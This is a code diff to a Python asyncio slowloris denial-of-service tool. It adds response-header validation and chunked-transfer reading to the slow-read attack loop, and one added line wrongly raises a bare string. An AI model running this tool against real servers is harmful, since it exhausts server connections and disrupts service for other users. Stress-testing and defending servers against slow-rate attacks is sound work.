@@ -234,6 +234,11 @@ async def slowloris_attack(host, port, read_rate, write_rate, https, path, heade
         time_read_start = time.time()
 
         raw_response_headers = await slowloris_readuntil(reader, b'\r\n\r\n', read_rate)
+
+        if not raw_response_headers.startswith(b'HTTP/'):
+            writer.close()
+            raise Exception('Could not get response headers')
+
         raw_response_headers = raw_response_headers.strip().split(b'\r\n')
 
         response_headers = {}
@@ -250,6 +255,22 @@ async def slowloris_attack(host, port, read_rate, write_rate, https, path, heade
 
         if length := int(response_headers.get(b'content-length', 0)):
             await slowloris_read(reader, read_rate, n=length)
+        elif response_headers.get(b'transfer-encoding', b'').lower() == b'chunked':
+            while True:
+                length = await slowloris_readuntil(reader, b'\r\n', read_rate)
+                length = length.strip()
+                if not length or len(length) == 0:
+                    writer.close()
+                    raise Exception('Could not read chunked body')
+
+                try:
+                    length = int(length, base=16) + 2
+                except:
+                    raise "Chunk length is not a valid hex string"
+
+                await slowloris_read(reader, read_rate, length)
+                if length == 2:
+                    break
 
         print(f'Got http response {status_text} in {time.time()-time_read_start} seconds')
 
